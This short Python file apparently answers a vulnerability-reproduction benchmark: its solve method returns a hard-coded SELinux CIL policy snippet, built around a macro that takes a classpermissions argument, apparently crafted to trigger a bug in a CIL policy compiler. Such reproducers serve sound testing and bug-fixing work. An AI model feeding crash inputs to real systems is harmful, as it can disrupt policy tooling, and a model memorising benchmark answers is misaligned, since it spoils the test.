class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = "(type foo)\n(type bar)\n(class process)\n(permission read process)\n(macro mac ((classpermissions cps))\n(allow foo bar (cps)))\n(mac ((process (read))))"
        return poc.encode('utf-8')
